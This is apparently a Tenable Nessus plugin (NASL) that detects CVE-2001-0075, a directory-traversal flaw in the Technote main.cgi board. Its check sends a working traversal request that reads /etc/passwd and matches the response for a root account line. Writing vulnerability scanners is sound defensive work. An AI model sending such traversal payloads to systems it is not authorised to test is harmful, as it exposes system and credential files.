#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10584);
 script_version ("$Revision: 1.21 $");
 script_cve_id("CVE-2001-0075");
 script_bugtraq_id(2156);
 script_xref(name:"OSVDB", value:"481");
 
 script_name(english:"Technote main.cgi filename Parameter Traversal Arbitrary File Access");
 
 script_set_attribute(attribute:"synopsis", value:
"It is possible to read arbitrary files from the remote 
system." );
 script_set_attribute(attribute:"description", value:
"The technote CGI board is installed. This board has
a well known security flaw in the CGI main.cgi that 
lets an attacker read arbitrary files with the privileges 
of the http daemon (usually root or nobody)." );
 script_set_attribute(attribute:"solution", value:
"remove it from /cgi-bin." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N" );

script_end_attributes();

 
 script_summary(english:"Checks for the presence of /technote/main.cgi");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

function check(url)
{
 local_var res,req;
 req = string(url,"/main.cgi?board=FREE_BOARD&command=down_load&filename=/../../../../../../../../etc/passwd");
 
 res = http_send_recv3(method:"GET", item:req, port:port); 
 if (isnull(res) ) exit(0);
 
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:res[2]))
 	security_hole(port);
}

# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/technote", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
 check(url:dir);
}
